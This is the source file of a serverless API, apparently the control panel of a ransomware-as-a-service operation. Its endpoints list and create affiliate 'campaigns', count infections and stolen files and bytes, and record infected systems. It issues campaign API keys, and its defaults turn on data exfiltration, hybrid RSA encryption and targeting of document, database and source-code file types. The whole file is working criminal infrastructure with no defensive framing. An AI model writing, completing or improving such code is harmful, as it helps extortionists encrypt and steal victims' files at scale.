// vercel-dashboard/api/affiliates/campaigns.js
// Affiliate Campaigns API

import { kv } from '../../lib/kv.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  try {
    const auth = await verifyAuth(request);
    if (!auth.valid) return response.status(401).json({ error: 'Unauthorized' });

    switch (request.method) {
      case 'GET':
        return await handleGet(request, response, auth);
      case 'POST':
        return await handlePost(request, response, auth);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Affiliate Campaigns API error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(request, response, auth) {
  const { id, includeStats, limit = 50, offset = 0 } = request.query;

  // Admins can view any affiliate's campaigns
  let targetAffiliateId = request.query.affiliateId;
  if (auth.role !== 'admin') {
    targetAffiliateId = auth.affiliateId;
  }

  if (!targetAffiliateId) {
    return response.status(400).json({ error: 'Affiliate ID required' });
  }

  if (id) {
    // Single campaign
    const campaign = await kv.get(`campaign:${id}`);
    if (!campaign) return response.status(404).json({ error: 'Campaign not found' });

    // Check ownership
    if (auth.role !== 'admin' && campaign.affiliateId !== targetAffiliateId) {
      return response.status(403).json({ error: 'Forbidden' });
    }

    if (includeStats === 'true') {
      const stats = await kv.hgetall(`campaign:${id}:stats`);
      const systems = await kv.smembers(`campaign:${id}:systems`) || [];
      campaign.stats = stats || {};
      campaign.systemCount = systems.length;
      campaign.systems = systems.slice(0, 50);
    }
    return response.json(campaign);
  }

  // List campaigns for affiliate
  const campaignIds = await kv.smembers(`affiliate:${targetAffiliateId}:campaigns`) || [];
  const campaigns = [];

  for (const cid of campaignIds) {
    const c = await kv.get(`campaign:${cid}`);
    if (c) {
      const stats = await kv.hgetall(`campaign:${cid}:stats`);
      const systemCount = (await kv.scard(`campaign:${cid}:systems`)) || 0;
      campaigns.push({
        id: c.id,
        name: c.name,
        apiKey: c.apiKey,
        createdAt: c.createdAt,
        status: c.status,
        stats: {
          totalInfections: parseInt(stats?.totalInfections || '0'),
          totalFiles: parseInt(stats?.totalFiles || '0'),
          totalBytes: parseInt(stats?.totalBytes || '0'),
          lastActivity: stats?.lastActivity
        },
        systemCount
      });
    }
  }

  // Sort by last activity
  campaigns.sort((a, b) => new Date(b.stats.lastActivity || 0) - new Date(a.stats.lastActivity || 0));

  // Paginate
  const start = parseInt(offset);
  const lim = parseInt(limit);
  const paginated = campaigns.slice(start, start + lim);

  response.json({
    campaigns: paginated,
    total: campaigns.length,
    page: Math.floor(start / lim) + 1,
    pageSize: lim
  });
}

async function handlePost(request, response, auth) {
  const { name, description, rsaKeySize = 4096 } = request.body;

  if (!name) return response.status(400).json({ error: 'Campaign name required' });

  const affiliateId = auth.role === 'admin' && request.body.affiliateId ? request.body.affiliateId : auth.affiliateId;

  // Check affiliate exists
  const affiliate = await kv.get(`affiliate:${affiliateId}`);
  if (!affiliate) return response.status(404).json({ error: 'Affiliate not found' });

  const id = `camp_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const generatedApiKey = `ck_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 10)}`;

  const campaign = {
    id,
    name,
    description: description || '',
    apiKey: generatedApiKey,
    rsaKeySize,
    status: 'active',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    affiliateId,
    settings: {
      exfilEnabled: true,
      encryptionMode: 'Hybrid',
      maxFileSizeMB: 50,
      targetExtensions: ['.txt', '.doc', '.docx', '.pdf', '.sql', '.json', '.cs', '.py', '.js']
    }
  };

  campaign.keyPlaceholder = true;

  const operations = [
    kv.set(`campaign:${id}`, campaign),
    kv.sadd('global:campaigns', id),
    kv.sadd(`affiliate:${affiliateId}:campaigns`, id),
    kv.hset(`campaign:${id}:stats`, {
      totalInfections: 0,
      totalFiles: 0,
      totalBytes: 0,
      createdAt: campaign.createdAt
    }),
    kv.hincrby(`affiliate:${affiliateId}:stats`, 'totalCampaignsCreated', 1)
  ];

  await Promise.all(operations);

  response.status(201).json(campaign);
}

async function verifyAuth(request) {
  const authHeader = request.headers['authorization']?.replace('Bearer ', '');
  if (!authHeader) return { valid: false };

  // Check master key
  if (authHeader === process.env.MASTER_API_KEY) {
    return { valid: true, role: 'admin', affiliateId: null };
  }

  // Check session
  const session = await kv.get(`session:${authHeader}`);
  if (session && new Date(session.expiresAt) > new Date()) {
    return { valid: true, role: 'affiliate', affiliateId: session.affiliateId };
  }

  // Check API key
  const affiliateIds = await kv.smembers('global:affiliates') || [];
  for (const aid of affiliateIds) {
    const a = await kv.get(`affiliate:${aid}`);
    if (a && a.apiKey === authHeader) {
      return { valid: true, role: 'affiliate', affiliateId: aid };
    }
  }

  return { valid: false };
}
